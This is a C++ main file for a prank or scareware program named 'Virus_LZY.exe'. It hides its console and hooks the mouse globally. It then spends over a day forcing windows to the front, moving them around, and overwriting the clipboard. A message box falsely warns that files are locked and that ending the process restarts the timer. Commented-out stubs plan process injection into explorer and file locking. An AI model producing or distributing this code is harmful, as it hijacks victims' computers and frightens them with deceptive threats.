#pragma once
#include"Trick.h"
#include"Secure.h"
#include"Hazard.h"
DWORD StartTime = GetTickCount();
int main() {
	srand(time(NULL));
	/*
	InjectProcess(GetExplorerId());
	*/
	//函数功能待实现
	cout << "How many LZY do you want? (min:1, max:10)" << endl;
	cin >> num;
	num = max(1, min(10, num));
	cout << "How fast do you want LZY to move? (min:1, max:10)" << endl;
	cin >> speed1;
	speed1 = max(1, min(10, speed1));
	cout << "How fast do you want LZY to rotate? (min:1, max:10)" << endl;
	cin >> speed2;
	speed2 = max(1, min(10, speed2));
	ShowWindow(GetForegroundWindow(), SW_HIDE);
	MessageBox(NULL, L"Program Virus_LZY.exe has started running, \nit will end after 114514 seconds. \nDo not try to end this process, \nor the timer will restart. \nEvery 10 minutes you should answer a question, \nso as to unlock the locked files, \nor maybe just to save your computer. \nGood Luck!", L"Tip", MB_OK);
	mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProc, NULL, 0);
	for (int i = 0; i < num; i++) {
		SetImage(i);
	}
	/*
	ChangeProcessName("LZY");
	ChangeIcon();
	ChangeBackGround();
	LockFiles();
	*/
	//函数功能待实现
	
	while (GetTickCount() - StartTime < 1000 * 114514) {
		for (int i = 0; i < num; i++) {
			SetWindowPos(FindWindow(NULL, name[i]), HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
			ShowWindow(FindWindow(NULL, name[i]), SW_RESTORE);
		}
		MoveWindowToTarget();
		SetClipBoard("卤蛋?吕知言!");

		/*
		if (((GetTickCount() - StartTime) / 1000 %900 == 0) {
			question=rand()%7;
			if (Question()) {
				MessageBox(NULL, L"Congratulations!One of your files has been unlocked!", L"Tip", MB_OK);
				UnlockFiles();
			}
			else {
				MessageBox(NULL, L"Locked files + 1", L"Tip", MB_OK);
			}
		}
		*/
		//函数功能待实现

	}
	PlayAudio();
	return 0;
}